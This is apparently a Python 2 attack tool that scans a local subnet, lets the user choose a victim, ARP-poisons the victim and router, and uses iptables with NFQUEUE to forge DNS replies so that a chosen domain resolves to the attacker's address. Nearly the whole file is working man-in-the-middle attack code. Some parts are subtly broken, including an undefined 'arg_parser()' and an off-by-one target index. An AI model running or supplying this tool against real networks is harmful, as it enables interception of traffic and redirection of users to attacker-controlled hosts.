#!/usr/bin/python
from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
import os
import sys
import nfqueue
from scapy.all import *
import argparse
import threading
import signal
import time
from subprocess import Popen


listofip = []
global victimMAC, routerMAC


def ScanTheNetwork():
    ip_araligi_deger = '192.168.0' #raw_input("\n\nEnter network address [example:192.168.0] :")
    devnull = open(os.devnull, 'wb')
    # print " The Network Address\n\n ",ip_araligi_deger
    p=[]
    hostlist = 0
    j=0
    for hostUp in range(0,255):
        ip = ip_araligi_deger + ".%d" % hostUp
        p.append((ip, Popen(['ping','-c', '3', ip], stdout=devnull)))
    while p:
        for i, (ip, proc) in enumerate(p[:]):
            if proc.poll() is not None:
                p.remove((ip, proc))
                if proc.returncode == 0:
                    # print('%s Host is up' % ip)
                    listofip.append(ip)
                    hostlist += 1
                else:
                    pass
        time.sleep(.04)
    devnull.close()
    return listofip

#listing all the target ip
def targetSelect(listofip):
    n=1
    print "\n\n\n"
    print "Select the Target to attack "
    print "+-------------------------+"
    for i in listofip:
        print  "|{0:4} -> {1:^16} |".format(n,i)
        n +=1
    print "+-------------------------+"
    print "\n\n\n"

# this function is for dns spoofing
def dnsSpoof(listofip):
    if len(listofip) == 0:
        print "\n\nYou have to Scan the network First\n\n"
    else:
        n=1
        print "\n"
        print "Device list from the Network Scan"
        print "+-------------------------+"
        for i in listofip:
            print  "|{0:4} -> {1:^16} |".format(n,i)
            n +=1
        print "+-------------------------+"
        print "\n\n"
        print "Select the id of the ip address for attack"
        id = int(raw_input("> "))
        victimIP = listofip[id]
        domain = raw_input("Enter Domain to spoof :")
        routerIP = raw_input("Enter the router IP :")
        # redirectto = raw_input("Optional Input choose the IP to which the victim will be redirected :")
        # spoofall = raw_input("Spoof all DNS requests back to the attacker or use :"")

        # creating class for
        def originalMAC(ip):
            ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
            for s,r in ans:
                return r[Ether].src

        def poison(routerIP, victimIP, routerMAC, victimMAC):
            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

        def restore(routerIP, victimIP, routerMAC, victimMAC):
            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
            sys.exit(0)

        def cb(payload):
            data = payload.get_data()
            pkt = IP(data)
            localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
            if not pkt.haslayer(DNSQR):
                payload.set_verdict(nfqueue.NF_ACCEPT)
            else:
                if arg_parser().spoofall:
                    if not arg_parser().redirectto:
                        spoofed_pkt(payload, pkt, localIP)
                    else:
                        spoofed_pkt(payload, pkt, arg_parser().redirectto)
                if arg_parser().domain:
                    if arg_parser().domain in pkt[DNS].qd.qname:
                        if not arg_parser().redirectto:
                            spoofed_pkt(payload, pkt, localIP)
                        else:
                            spoofed_pkt(payload, pkt, arg_parser().redirectto)

        def spoofed_pkt(payload, pkt, rIP):
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
            print '[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1]

        class Queued(object):
            def __init__(self):
                self.q = nfqueue.queue()
                self.q.set_callback(cb)
                self.q.fast_open(0, socket.AF_INET)
                self.q.set_queue_maxlen(5000)
                reactor.addReader(self)
                self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
                print '[*] Waiting for data'
            def fileno(self):
                return self.q.get_fd()
            def doRead(self):
                self.q.process_pending(100)
            def connectionLost(self, reason):
                reactor.removeReader(self)
            def logPrefix(self):
                return 'queue'

        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')

        ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
        ipf_read = ipf.read()
        if ipf_read != '1\n':
            ipf.write('1\n')
        ipf.close()

        routerMAC = originalMAC(routerIP)
        victimMAC = originalMAC(victimIP)
        if routerMAC == None:
            sys.exit("Could not find router MAC address. Closing....")
        if victimMAC == None:
            sys.exit("Could not find victim MAC address. Closing....")
        print '[*] Router MAC:',routerMAC
        print '[*] Victim MAC:',victimMAC

        Queued()
        rctr = threading.Thread(target=reactor.run, args=(False,))
        rctr.daemon = True
        rctr.start()

        def signal_handler(signal, frame):
            print 'learing iptables, sending healing packets, and turning off IP forwarding...'
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
                forward.write(ipf_read)
            restore(routerIP, victimIP, routerMAC, victimMAC)
            restore(routerIP, victimIP, routerMAC, victimMAC)
            os.system('/sbin/iptables -F')
            os.system('/sbin/iptables -X')
            os.system('/sbin/iptables -t nat -F')
            os.system('/sbin/iptables -t nat -X')
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)

        while 1:
            poison(routerIP, victimIP, routerMAC, victimMAC)
            time.sleep(1.5)




def main():
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    while True:
        print "1 for Scan the IP "
        print "2 for Dns spoof "
        print "Do you want to Scan the IP "
        print "4 for Exit "

        input = int(raw_input(">"))
        if input == 1:
            ScanTheNetwork()
            targetSelect(listofip)
        elif input == 2:
            dnsSpoof(listofip)
        elif input == 4:
            exit()



if __name__ =='__main__':
    main()
